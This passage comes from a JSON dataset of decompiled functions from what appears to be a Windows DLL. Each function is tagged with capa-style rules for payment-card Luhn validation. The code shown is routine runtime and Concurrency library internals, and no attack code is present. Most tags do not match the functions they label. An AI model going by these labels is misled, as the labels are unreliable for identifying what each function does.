        "decompiled_code": "\nulong * fcn.180089288(ulong *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    ulong *puVar3;\n    ushort *arg2_00;\n    ushort in_R9W;\n    \n    uVar1 = arg1[2];\n    if (uVar1 < arg2) {\n        fcn.180011cd0();\n        pcVar2 = swi(3);\n        puVar3 = (*pcVar2)();\n        return puVar3;\n    }\n    if (arg1[3] - uVar1 < arg3) {\n        arg1 = fcn.1800761a0(arg1, arg3, 0, arg2);\n    }\n    else {\n        arg1[2] = uVar1 + arg3;\n        puVar3 = arg1;\n        if (7 < arg1[3]) {\n            puVar3 = *arg1;\n        }\n        arg2_00 = puVar3 + arg2 * 2;\n        fcn.1800ade80(arg2_00 + arg3, arg2_00, (uVar1 - arg2) * 2 + 2);\n        if (arg3 != 0) {\n            for (; arg3 != 0; arg3 = arg3 - 1) {\n                *arg2_00 = in_R9W;\n                arg2_00 = arg2_00 + 1;\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 333
    },
    "18008f95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18008f950(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    \n    if (*0x1801288c0 == 0) {\n        uVar1 = fcn.18008f91c(arg1);\n        (**0x1800de3a8)(uVar1, arg2, arg3, arg4);\n    }\n    else {\n        (**0x1800de8f0)();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "18009244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180092440(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800adaec(&uStack24, arg1 + 1);\n    *arg1 = vtable.Concurrency::improper_lock.0;\n    return arg1;\n}\n",
        "token_count": 117
    },
    "1800924d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.1800924d0(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800adaec(&uStack24, arg1 + 1);\n    *arg1 = vtable.Concurrency::invalid_scheduler_policy_key.0;\n    return arg1;\n}\n",
        "token_count": 120
    },
    "18009253": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180092530(code **arg1, ulong arg2)\n\n{\n    ulong uStack24;\n    uchar uStack16;\n    \n    uStack16 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack24 = arg2;\n    fcn.1800adaec(&uStack24, arg1 + 1);\n    *arg1 = vtable.Concurrency::invalid_scheduler_policy_value.0;\n    return arg1;\n}\n",
        "token_count": 118
    },
    "180092e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.180092e60(int64_t arg1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auVar5 [16];\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    ulong uVar9;\n    int64_t arg1_00;\n    int64_t iVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    \n    auVar5 = ZEXT816(0x40) * ZEXT416(*(arg1 + 0x1c));\n    uVar9 = SUB168(auVar5, 0);\n    if (SUB168(auVar5 >> 0x40, 0) != 0) {\n        uVar9 = 0xffffffffffffffff;\n    }\n    arg1_00 = fcn.18008ff14(uVar9);\n    fcn.1800ae290(arg1_00, 0, *(arg1 + 0x1c) << 6);\n    uVar15 = 0;\n    if (*(arg1 + 0x1c) != 0) {\n        do {\n            iVar12 = uVar15 * 0x40;\n            iVar3 = *(arg1 + 0x60);\n            puVar1 = iVar12 + iVar3;\n            uVar6 = puVar1[1];\n            uVar7 = puVar1[2];\n            uVar8 = puVar1[3];\n            puVar2 = iVar12 + arg1_00;\n            *puVar2 = *puVar1;\n            puVar2[1] = uVar6;\n            puVar2[2] = uVar7;\n            puVar2[3] = uVar8;\n            puVar1 = iVar12 + 0x10 + iVar3;\n            uVar6 = puVar1[1];\n            uVar7 = puVar1[2];\n            uVar8 = puVar1[3];\n            puVar2 = iVar12 + 0x10 + arg1_00;\n            *puVar2 = *puVar1;\n            puVar2[1] = uVar6;\n            puVar2[2] = uVar7;\n            puVar2[3] = uVar8;\n            uVar11 = *(iVar12 + 8 + arg1_00);\n            uVar9 = SUB168(ZEXT816(0x48) * ZEXT816(uVar11), 0);\n            if (SUB168(ZEXT816(0x48) * ZEXT816(uVar11) >> 0x40, 0) != 0) {\n                uVar9 = 0xffffffffffffffff;\n            }\n            iVar10 = fcn.18008ff14(uVar9);\n            iVar4 = iVar10;\n            if (iVar10 == 0) {\n                iVar10 = 0;\n            }\n            else {\n                for (; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    fcn.1800927a4(iVar4);\n                    iVar4 = iVar4 + 0x48;\n                }\n            }\n            *(iVar12 + 0x38 + arg1_00) = iVar10;\n            fcn.1800ae290(iVar10, 0, *(iVar12 + 8 + arg1_00) * 0x48);\n            uVar11 = 0;\n            if (*(iVar12 + 8 + arg1_00) != 0) {\n                do {\n                    iVar13 = uVar11 * 0x30;\n                    iVar4 = *(iVar12 + 0x30 + iVar3);\n                    iVar10 = *(iVar12 + 0x38 + arg1_00);\n                    *(iVar10 + uVar11 * 0x48) = *(iVar4 + iVar13);\n                    *(iVar10 + 8 + uVar11 * 0x48) = *(iVar4 + 8 + iVar13);\n                    *(*(iVar12 + 0x38 + arg1_00) + uVar11 * 0x48) = 1;\n                    *(*(iVar12 + 0x38 + arg1_00) + 0x20 + uVar11 * 0x48) = *(iVar12 + 0x30 + iVar3) + 0x18 + iVar13;\n                    uVar14 = uVar11 + 1;\n                    uVar11 = uVar14;\n                } while (uVar14 < *(iVar12 + 8 + arg1_00));\n            }\n            uVar15 = uVar15 + 1;\n        } while (uVar15 < *(arg1 + 0x1c));\n    }\n    return arg1_00;\n}\n",
        "token_count": 1059
    },
    "18009585": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180095850(int64_t arg1)\n\n{\n    uchar (*arg4) [16];\n    uint uVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int64_t arg3;\n    uint64_t arg2;\n    bool bVar7;\n    \n    arg2 = 0;\n    fcn.18009517c(arg1);\n    arg3 = *(arg1 + 0x98);\n    bVar7 = arg3 == 0;\n    do {\n        if (bVar7) {\n            arg3 = 0;\n        }\n        else {\n            arg3 = *(arg3 + 0x30);\n        }\n        if (arg3 == 0) {\n            return;\n        }\n        arg4 = arg3 + 0x70;\n        *arg4 = ZEXT816(0);\n        *(arg3 + 0x80) = ZEXT816(0);\n        *(arg3 + 0x90) = ZEXT816(0);\n        *(arg3 + 0xa0) = 0;\n        fcn.18009577c(arg1, arg2, arg3, arg4);\n        uVar3 = *(arg3 + 0xd0);\n        if (*(arg3 + 0x108) == '\\0') {\n            *(arg3 + 0x94) = uVar3;\n        }\n        else {\n            uVar1 = *(arg3 + 0xa8);\n            (**0x1800de8f0)();\n            uVar3 = fcn.1800a0d30(*(arg3 + 0x68), uVar3, 0, 0);\n            *(arg3 + 0x94) = uVar3;\n            if (*(arg3 + 0xd0) <= uVar3 && uVar3 != *(arg3 + 0xd0)) {\n                uVar4 = fcn.1800a15c4(arg3, uVar3);\n                *(arg3 + 0x94) = uVar4;\n            }\n            *(arg3 + 0xa8) = uVar1;\n        }\n        uVar3 = *(arg3 + 0xd0);\n        if (uVar3 == 0) {\n            if (*(arg3 + 0xf8) != 0) goto code_r0x000180095974;\ncode_r0x00018009594a:\n            uVar2 = 0;\n        }\n        else {\n            if ((*(arg3 + 0x88) != 0) || (*(arg3 + 0x94) <= uVar3 && uVar3 != *(arg3 + 0x94)))\n            goto code_r0x00018009594a;\ncode_r0x000180095974:\n            uVar6 = *(arg3 + 0xe8) + *(arg3 + 0xb0);\n            uVar5 = *(arg3 + 0xec);\n            if (uVar6 <= *(arg3 + 0xec)) {\n                uVar5 = uVar6;\n            }\n            if (uVar5 <= uVar3) goto code_r0x00018009594a;\n            uVar2 = 1;\n        }\n        *(arg3 + 0x91) = uVar2;\n        *(*(arg1 + 0x78) + arg2 * 8) = arg4;\n        arg2 = arg2 + 1;\n        bVar7 = arg3 == *(arg1 + 0x98);\n    } while( true );\n}\n",
        "token_count": 786
    },
    "18009e7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18009e7a8(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    \n    iVar1 = *(arg1 + 0x40);\n    arg1_00 = *(iVar1 + 0xc0);\n    fcn.18009234c(arg1_00);\n    iVar5 = *(iVar1 + 0xb4);\n    iVar4 = *(iVar1 + 0xb4);\n    uVar6 = iVar4 - 1;\n    if (*(iVar1 + 0xb0) <= uVar6) {\n        do {\n            iVar2 = *(*(iVar1 + 0xd0) + (*(iVar1 + 0xb8) & uVar6) * 8);\n            if (((iVar2 != 0) && (cVar3 = (**0x1800de8f0)(iVar2, arg3),  cVar3 != '\\0')) &&\n               (cVar3 = (**0x1800de8f0)(iVar2, arg3),  cVar3 != '\\0')) {\n                if (iVar4 == iVar5) {\n                    iVar5 = iVar5 + -1;\n                }\n                else {\n                    *(*(iVar1 + 0xd0) + (*(iVar1 + 0xb8) & uVar6) * 8) = 0;\n                }\n            }\n            uVar6 = uVar6 - 1;\n            iVar4 = iVar4 + -1;\n        } while (*(iVar1 + 0xb0) <= uVar6);\n    }\n    *(iVar1 + 0xb4) = iVar5;\n    fcn.180092394(arg1_00);\n    return;\n}\n",
        "token_count": 416
    },
    "18009fbd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18009fbd0(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar3 = fcn.1800d601c();\n    LOCK();\n    if (*(arg1 + 0x10) != 0) {\ncode_r0x00018009fc55:\n        LOCK();\n        piVar1 = arg1 + 8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar3 == 1) {\n            (**0x1800de8f0)(arg1);\n        }\n        return;\n    }\n    *(arg1 + 0x10) = iVar3;\n    (**0x1800de8f0)(arg1);\n    LOCK();\n    piVar1 = arg1 + 0x10;\n    if (iVar3 == *piVar1) {\n        *piVar1 = 3;\n    }\n    else {\n        iVar3 = *piVar1;\n    }\n    if (iVar3 != 2) goto code_r0x00018009fc55;\n    uVar4 = fcn.180074ca4(arg1 + 0x60);\n    if (uVar4 == 0) {\n        *(arg1 + 0xb0) = 1;\n        uVar4 = fcn.180074cc8(arg1 + 0x60);\n        if (uVar4 != 0) goto code_r0x00018009fc8d;\n        uVar4 = fcn.1800d6c04(arg1 + 0x18);\n        if (uVar4 == 0) goto code_r0x00018009fc55;\n        uVar4 = fcn.180074934(uVar4);\n    }\n    uVar4 = fcn.180074934(uVar4);\ncode_r0x00018009fc8d:\n    fcn.180074934(uVar4);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 464
    },
    "18009fd9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18009fd9c(int64_t arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    \n    *(arg2 + 0x10) = 0;\n    bVar2 = true;\n    LOCK();\n    *(arg2 + 8) = *(arg2 + 8) + 1;\n    *(arg2 + 0xb8) = arg1;\n    if (*(arg1 + 0x10) != 0) {\ncode_r0x00018009fe40:\n        fcn.18009fbd0(arg2);\n        return;\n    }\n    uVar3 = fcn.180074ca4(arg1 + 0x18);\n    if (uVar3 == 0) {\n        if (*(arg1 + 0x10) == 0) {\n            bVar2 = false;\n            piVar4 = fcn.18008fb2c(0x10);\n            if (piVar4 == NULL) {\n                piVar4 = NULL;\n            }\n            else {\n                *piVar4 = arg2;\n                piVar4[1] = 0;\n            }\n            if (*(arg1 + 0x68) == 0) {\n                *(arg1 + 0x68) = piVar4;\n            }\n            else {\n                *(*(arg1 + 0x70) + 8) = piVar4;\n            }\n            *(arg1 + 0x70) = piVar4;\n        }\n        uVar3 = fcn.180074cc8(arg1 + 0x18);\n        if (uVar3 == 0) {\n            if (!bVar2) {\n                return;\n            }\n            goto code_r0x00018009fe40;\n        }\n        uVar3 = fcn.180074934(uVar3);\n    }\n    fcn.180074934(uVar3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 452
    },
    "1800a14c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800a14c4(int64_t arg1, int64_t *arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    int32_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int64_t *piVar9;\n    \n    arg3 = arg3 & 0xffffffff;\n    fcn.180074eb0(arg1 + 0x40);\n    uVar8 = arg3;\n    piVar9 = arg2;\n    if (arg3 != 0) {\n        do {\n            iVar3 = *piVar9;\n            uVar6 = (**0x1800de8f0)(iVar3);\n            uVar7 = *(iVar3 + 0x54);\n            iVar4 = *(uVar6 * 0x40 + 0x38 + *(arg1 + 0x20));\n            iVar1 = iVar3 + 0x10;\n            iVar5 = *(iVar4 + 0x18 + uVar7 * 0x48);\n            if (iVar5 == 0) {\n                *(iVar3 + 0x68) = iVar1;\n                *(iVar3 + 0x60) = iVar1;\n            }\n            else {\n                *(iVar3 + 0x68) = *(iVar5 + 0x58);\n                *(iVar3 + 0x60) = *(iVar4 + 0x18 + uVar7 * 0x48);\n                *(*(*(iVar4 + 0x18 + uVar7 * 0x48) + 0x58) + 0x50) = iVar1;\n                *(*(iVar4 + 0x18 + uVar7 * 0x48) + 0x58) = iVar1;\n            }\n            *(iVar4 + 0x18 + uVar7 * 0x48) = iVar1;\n            piVar2 = iVar4 + 0x10 + uVar7 * 0x48;\n            *piVar2 = *piVar2 + 1;\n            uVar8 = uVar8 - 1;\n            piVar9 = piVar9 + 1;\n        } while (uVar8 != 0);\n    }\n    (**0x1800de8f0)(*(arg1 + 0x10), arg2, arg3);\n    *(arg1 + 0xcc) = *(arg1 + 0xcc) + arg3;\n    fcn.180074eb8(arg1 + 0x40);\n    return;\n}\n",
        "token_count": 585
    },
    "1800a1ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.1800a1ab0(int64_t arg1, code **arg2, ulong noname_2, ulong arg4)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    code **ppcVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    ulong uVar6;\n    uint *puVar7;\n    ulong arg1_00;\n    int64_t iVar8;\n    \n    iVar2 = *(*(arg1 + 0x20) + 0x38 + *(arg2 + 8) * 0x40);\n    iVar8 = *(arg2 + 0x44) * 0x48;\n    if (*(iVar2 + 0x3c + iVar8) + *(iVar2 + 0x34 + iVar8) == 0) {\n        piVar1 = *(arg1 + 0x20) + 0x24 + *(arg2 + 8) * 0x40;\n        *piVar1 = *piVar1 + -1;\n        *(iVar2 + iVar8) = 1;\n        *(arg1 + 0xd0) = *(arg1 + 0xd0) + -1;\n        piVar1 = *(arg2 + 0x44) * 0x30 + *(*(arg2 + 8) * 0x40 + 0x30 + *(*(arg1 + 0x18) + 0x60)) + 0x18;\n        *piVar1 = *piVar1 + -1;\n    }\n    fcn.180074eb0(arg1 + 0x40);\n    piVar1 = iVar2 + 0x10 + iVar8;\n    *piVar1 = *piVar1 + -1;\n    *(arg2[0xb] + 0x50) = arg2[10];\n    *(arg2[10] + 0x58) = arg2[0xb];\n    ppcVar3 = *(iVar2 + 0x18 + iVar8);\n    if (arg2 == ppcVar3) {\n        if (ppcVar3 == ppcVar3[0xb]) {\n            pcVar5 = NULL;\n        }\n        else {\n            pcVar5 = ppcVar3[10];\n        }\n        *(iVar2 + 0x18 + iVar8) = pcVar5;\n    }\n    fcn.180074eb8(arg1 + 0x40);\n    *arg2 = vtable.Concurrency::details::ExecutionResource.0;\n    uVar6 = 0;\n    if ((arg2 != NULL) && (arg1_00 = *0x180129fa0,  uVar6 = (**0x1800de208)(*0x180129fa0, 0, arg2),  uVar6 == 0)) {\n        puVar7 = fcn.1800ba53c(arg1_00);\n        uVar4 = (**0x1800de400)();\n        uVar6 = fcn.1800ba484(uVar4);\n        *puVar7 = uVar6;\n    }\n    return uVar6;\n}\n",
        "token_count": 689
    },
    "1800a2e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.1800a2e90(code **arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    \n    *arg1 = vtable.Concurrency::details::ThreadProxyFactory_class_Concurrency::details::FreeThreadProxy_.0;\n    *(arg1 + 1) = *(arg2 + 0x10);\n    arg1_00 = arg1 + 2;\n    iVar1 = 4;\n    do {\n        fcn.1800a2e78(arg1_00);\n        arg1_00 = arg1_00 + 2;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *arg1 = vtable.Concurrency::details::FreeThreadProxyFactory.0;\n    *(arg1 + 10) = 1;\n    *(arg1 + 0x54) = 0;\n    return arg1;\n}\n",
        "token_count": 207
    },
    "1800a30e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.1800a30ec(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *arg1;\n    iVar2 = 0;\n    if (iVar1 == 0) {\n        fcn.180074eb0(arg1 + 3);\n        if (*arg1 == 0) {\n            if (*0x1801292dc == 0) {\n                *0x1801292dc = fcn.180094c40();\n                *0x1801292dc = *0x1801292dc << 2;\n            }\n            iVar1 = fcn.18008fb2c(0x60);\n            if (iVar1 != 0) {\n                iVar2 = fcn.1800a2e90(iVar1, arg1);\n            }\n            *arg1 = iVar2;\n        }\n        fcn.180074eb8(arg1 + 3);\n        iVar1 = *arg1;\n    }\n    return iVar1;\n}\n",
        "token_count": 226
    },
    "1800a39b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * fcn.1800a39b4(uint *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t arg1_00;\n    \n    *arg1 = 0;\n    arg1[1] = 0;\n    *(arg1 + 8) = arg2;\n    arg1[2] = 0x3f;\n    uVar1 = fcn.18008ff14(0x200);\n    *(arg1 + 4) = uVar1;\n    iVar2 = fcn.18008ff14(0x400);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar3 = 0x40;\n        arg1_00 = iVar2;\n        do {\n            fcn.1800976cc(arg1_00);\n            arg1_00 = arg1_00 + 0x10;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *(arg1 + 6) = iVar2;\n    fcn.1800ae290(*(arg1 + 4), 0, 0x200);\n    return arg1;\n}\n",
        "token_count": 276
    },
    "1800a863": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800a863c(int64_t arg1, int64_t arg2, ulong arg3, uint32_t *arg4)\n\n{\n    uint *arg2_00;\n    ulong uVar1;\n    uint *puVar2;\n    uint32_t auStackX8 [2];\n    uint auStackX16 [2];\n    uchar auStack40 [8];\n    ulong uStack32;\n    \n    *(arg1 + 0x1a8) = arg2;\n    *(arg1 + 0x10) = arg3;\n    *(arg1 + 0x18) = *(arg1 + 0x18) ^ (*(arg1 + 0x18) ^ *arg4) & 0xfffffff;\n    *(arg1 + 0x18) = (*arg4 ^ *(arg1 + 0x18)) & 0xfffffff ^ *arg4;\n    *(arg1 + 0x20) = *(arg4 + 2);\n    *(arg1 + 0x1c) = arg4[1];\n    uVar1 = *(arg4 + 4);\n    *(arg1 + 0x1c0) = 0;\n    *(arg1 + 0x28) = uVar1;\n    *(arg1 + 0x1d8) = 1;\n    puVar2 = fcn.180099270(*(arg2 + 8), auStack40, arg4);\n    arg2_00 = arg1 + 0x30;\n    fcn.18008fb24(*(arg1 + 0x38));\n    *arg2_00 = *puVar2;\n    *(arg1 + 0x38) = *(puVar2 + 2);\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.18008fb24(uStack32);\n    if ((*arg4 & 0xfffffff) == 3) {\n        auStackX8[0] = arg4[2];\n        fcn.180098cb4(*(arg2 + 8) + 0x248, auStackX8, auStackX16);\n        *(arg1 + 0x40) = auStackX16[0];\n    }\n    fcn.1800987b4(arg1 + 0x68, arg2_00);\n    if (*(arg1 + 0x88) != 0) {\n        fcn.1800987b4(*(arg1 + 0x88) + 8, arg2_00);\n    }\n    return;\n}\n",
        "token_count": 562
    },
    "1800aa0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * fcn.1800aa0f0(uint *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t arg1_00;\n    \n    *(arg1 + 4) = arg2;\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[7] = 0;\n    *(arg1 + 6) = 0;\n    arg1[3] = 0;\n    arg1[2] = 0x3f;\n    uVar1 = fcn.18008ff14(0x200);\n    *(arg1 + 8) = uVar1;\n    iVar2 = fcn.18008ff14(0x400);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar3 = 0x40;\n        arg1_00 = iVar2;\n        do {\n            fcn.1800976cc(arg1_00);\n            arg1_00 = arg1_00 + 0x10;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *(arg1 + 10) = iVar2;\n    return arg1;\n}\n",
        "token_count": 285
    },
    "1800b4d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.1800b4d84(int64_t arg1)\n\n{\n    int32_t *arg4;\n    int64_t arg1_00;\n    char cVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint64_t in_RAX;\n    uint64_t uVar4;\n    ulong uVar5;\n    ushort *arg2;\n    uchar uVar6;\n    uint32_t uVar7;\n    int64_t arg3;\n    ushort uStackX8;\n    uchar uStackX10;\n    \n    cVar1 = *(arg1 + 0x41);\n    uVar4 = in_RAX & 0xffffffffffffff00;\n    uVar6 = 0x78;\n    if (cVar1 < 'e') {\n        if (cVar1 == 'd') {\ncode_r0x0001800b4e77:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x0001800b4e7b:\n            uVar5 = 10;\ncode_r0x0001800b4e83:\n            uVar4 = fcn.1800b5960(arg1, uVar5);\n        }\n        else {\n            if (cVar1 == 'A') goto code_r0x0001800b4e8a;\n            if (cVar1 == 'C') {\ncode_r0x0001800b4df5:\n                uVar4 = fcn.1800b57fc(arg1);\n            }\n            else {\n                if (cVar1 < 'E') goto code_r0x0001800b4e93;\n                if (cVar1 < 'H') goto code_r0x0001800b4e8a;\n                if (cVar1 == 'S') {\ncode_r0x0001800b4e33:\n                    uVar4 = fcn.1800b5dd0(arg1);\n                }\n                else {\n                    if (cVar1 == 'X') goto code_r0x0001800b4e48;\n                    if (cVar1 != 'Z') {\n                        if (cVar1 != 'a') {\n                            if (cVar1 != 'c') goto code_r0x0001800b4e93;\n                            goto code_r0x0001800b4df5;\n                        }\n                        goto code_r0x0001800b4e8a;\n                    }\n                    uVar4 = fcn.1800b52b8(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if ('g' < cVar1) {\n            if (cVar1 == 'i') goto code_r0x0001800b4e77;\n            if (cVar1 == 'n') {\n                uVar4 = fcn.1800b5cf4(arg1);\n                goto code_r0x0001800b4e8f;\n            }\n            if (cVar1 == 'o') {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                uVar5 = 8;\n            }\n            else if (cVar1 == 'p') {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x0001800b4e48:\n                uVar5 = 0x10;\n            }\n            else {\n                if (cVar1 == 's') goto code_r0x0001800b4e33;\n                if (cVar1 == 'u') goto code_r0x0001800b4e7b;\n                if (cVar1 != 'x') goto code_r0x0001800b4e93;\n                uVar5 = 0x10;\n            }\n            goto code_r0x0001800b4e83;\n        }\ncode_r0x0001800b4e8a:\n        uVar4 = fcn.1800b53a8(arg1);\n    }\ncode_r0x0001800b4e8f:\n    if (uVar4 == '\\0') {\ncode_r0x0001800b4e93:\n        return uVar4 & 0xffffffffffffff00;\n    }\n    if (*(arg1 + 0x40) != '\\0') goto code_r0x0001800b4fce;\n    uVar2 = *(arg1 + 0x30);\n    uStackX8 = 0;\n    arg3 = 0;\n    uStackX10 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) == 0) goto code_r0x0001800b4eec;\n                uStackX8 = 0x20;\n            }\n            else {\n                uStackX8 = 0x2b;\n            }\n        }\n        else {\n            uStackX8 = 0x2d;\n        }\n        arg3 = 1;\n    }\ncode_r0x0001800b4eec:\n    cVar1 = *(arg1 + 0x41);\n    if (((cVar1 + 0xa8U & 0xdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((cVar1 + 0xbfU & 0xdf) == 0)) {\n        *(&uStackX8 + arg3) = 0x30;\n        if ((cVar1 == 'X') || (cVar1 == 'A')) {\n            uVar6 = 0x58;\n        }\n        *(&uStackX8 + arg3 + 1) = uVar6;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar7 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        